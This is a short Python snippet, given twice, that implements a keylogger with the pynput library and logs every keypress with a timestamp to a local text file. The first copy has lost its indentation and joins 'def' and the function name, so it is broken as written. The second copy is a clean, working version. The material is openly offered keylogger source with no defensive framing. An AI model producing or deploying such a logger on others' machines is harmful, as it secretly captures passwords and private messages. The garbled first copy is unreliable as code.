from pynput.keyboard import Key,Listener
import logging
#if no name it gets into an empty string
log_dir=""
#This is basic logging function
logging.basicConfig(filename=(log_dir+"key_log.txt"),level=logging.DEBUG,
format='%(asctime)s:%(message)s:')
#This is from the library
defon_press(key):
logging.info(str(key))
#This says,listener is on
with Listener(on_press=on_press) as listener:
listener.join()
--------------------------------------------------------------------------------

from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
